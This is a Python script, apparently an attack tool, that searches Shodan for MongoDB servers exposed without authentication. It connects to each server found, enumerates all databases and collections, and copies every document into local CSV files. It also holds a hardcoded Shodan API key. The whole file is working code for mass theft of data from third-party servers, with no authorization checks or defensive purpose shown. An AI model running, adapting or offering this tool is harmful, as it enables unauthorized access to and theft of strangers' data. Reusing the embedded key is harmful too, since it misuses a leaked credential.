import json
import csv
from shodan import Shodan, APIError
from pymongo import MongoClient
from concurrent.futures import ThreadPoolExecutor, as_completed


class MongoDBNoAuth:
    def __init__(self):
        self.api = Shodan('civYo8aALAhkpfQ3azo7Hw9BsltftueC')
        self.limit = 0
        self.mongo_urls = []

    def get_shodan(self, workers):
        self.limit = workers
        try:
            results = self.api.search_cursor('"MongoDB Server Information" port:27017 -authentication')
            if results:
                for banner in results:
                    try:
                        ip = banner.get('ip_str')
                        country_code = banner.get('location', {}).get('country_code')
                        port = banner.get('port')

                        if not ip or not port:
                            print("IP address or port not found in the banner.")
                            continue

                        mongo_url = f'mongodb://{ip}:{port}/'
                        self.mongo_urls.append({'url': mongo_url, 'ip': ip, 'port': port})
                        print(f"{ip} || {country_code} || {port}")

                        if len(self.mongo_urls) >= self.limit:
                            break
                    except (KeyError, TypeError, json.JSONDecodeError) as e:
                        print(f"Error parsing Shodan banner: {e}")
                        continue
            else:
                print("No results from Shodan API.")

        except APIError as e:
            print(f"Shodan API Error: {e}")
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

    def dump_collection_to_csv(self, mongo_url, ip, port, db_name, collection_name):
        try:
            client = MongoClient(mongo_url, serverSelectionTimeoutMS=4000)
            db = client[db_name]
            collection = db[collection_name]
            documents = collection.find()

            csv_filename = f"{ip}_{port}_{db_name}_{collection_name}.csv"

            with open(csv_filename, mode='w', newline='', encoding='utf-8') as file:
                writer = csv.writer(file)

                headers_written = False
                for document in documents:
                    if not headers_written:
                        headers = list(document.keys())
                        writer.writerow(headers)
                        headers_written = True

                    writer.writerow(list(document.values()))

            print(f"Collection '{collection_name}' from database '{db_name}' saved to '{csv_filename}'.")

        except Exception as e:
            print(f"An error occurred while dumping collection '{collection_name}' from database '{db_name}': {e}")

    def run_mongo_auth_proc(self, workers):
        try:
            self.get_shodan(workers)
            if not self.mongo_urls:
                print("No MongoDB instances found.")
                return

            for mongo_data in self.mongo_urls:
                mongo_url = mongo_data['url']
                ip = mongo_data['ip']
                port = mongo_data['port']

                try:
                    client = MongoClient(mongo_url, serverSelectionTimeoutMS=4000)  # 4-second timeout
                    databases = client.list_database_names()

                    print(f"Databases in {mongo_url}: {databases}")

                    for db_name in databases:
                        collections = client[db_name].list_collection_names()

                        with ThreadPoolExecutor(max_workers=workers) as executor:
                            futures = [
                                executor.submit(self.dump_collection_to_csv, mongo_url, ip, port, db_name, collection_name)
                                for collection_name in collections
                            ]

                            for future in as_completed(futures):
                                try:
                                    future.result()
                                except Exception as e:
                                    print(f"An error occurred during the thread execution: {e}")

                except Exception as e:
                    print(f"An error occurred while processing MongoDB instance {mongo_url}: {e}")

        except Exception as e:
            print(f"An unexpected error occurred: {e}")

